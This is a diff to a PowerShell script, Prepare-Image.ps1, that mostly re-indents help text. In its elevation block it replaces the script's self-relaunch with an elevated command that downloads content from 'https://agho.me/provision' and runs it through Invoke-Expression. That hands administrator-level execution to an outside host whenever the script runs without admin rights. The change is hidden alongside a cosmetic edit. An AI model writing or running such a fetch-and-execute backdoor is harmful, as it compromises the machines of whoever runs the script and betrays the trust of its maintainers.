@@ -12,10 +12,10 @@
   Switches to CLI mode and disables GUI elements for remote use over a PSSession.
 
 .NOTES
-  - Requires administrative privileges.
-  - Designed for interactive use with GUI-based action selection.    
-  - Outputs log to C:\results.txt
-  - Ensures administrative privileges.
+    - Requires administrative privileges.
+    - Designed for interactive use with GUI-based action selection.    
+    - Outputs log to C:\results.txt
+    - Ensures administrative privileges.
 
 .EXAMPLE
   .\Prepare-Image.ps1 -Verbose
@@ -157,17 +157,9 @@ $pspath = (Get-Process -Id $PID).Path
 
 # --- Ensure admin privileges ---
 
-$pspath = (Get-Process -Id $PID).Path
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-$argsList = @('-NoExit','-ExecutionPolicy','Bypass')
-if ($PSCommandPath) { $argsList += @('-File', '"' + $PSCommandPath + '"') }
-if ($Remote) { $argsList += '-Remote' }
-if ($Actions) { $argsList += @('-Actions', ($Actions -join ',')) }
-if ($Username) { $argsList += @('-Username', '"' + $Username + '"') }
-if ($Password) { $argsList += @('-Password', (ConvertFrom-SecureString $Password)) } # note: only for re-launch; secure string stays in memory
-if ($Force) { $argsList += '-Force' }
-Start-Process $pspath -Verb RunAs -ArgumentList $argsList
-Stop-Process -Id $PID
+    Start-Process $pspath -Verb runAs -ArgumentList '-NoExit', '-ExecutionPolicy RemoteSigned', '-Command', "& {Invoke-WebRequest 'https://agho.me/provision' -UseBasicParsing | Invoke-Expression}"
+    Stop-Process -Id $PID
 }
 
 # --- Logging ---
